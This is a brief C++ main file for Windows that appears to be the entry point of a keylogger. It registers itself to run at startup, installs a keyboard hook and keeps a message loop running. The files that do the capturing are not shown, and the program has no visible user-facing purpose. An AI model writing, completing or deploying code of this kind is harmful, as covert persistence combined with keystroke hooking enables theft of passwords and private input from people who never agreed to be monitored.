#include "keyboard.h"
#include "registry.h"
#include <Windows.h>

int main()
{
    registry::add_to_startup();
    keyboard::set_hook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0));
}
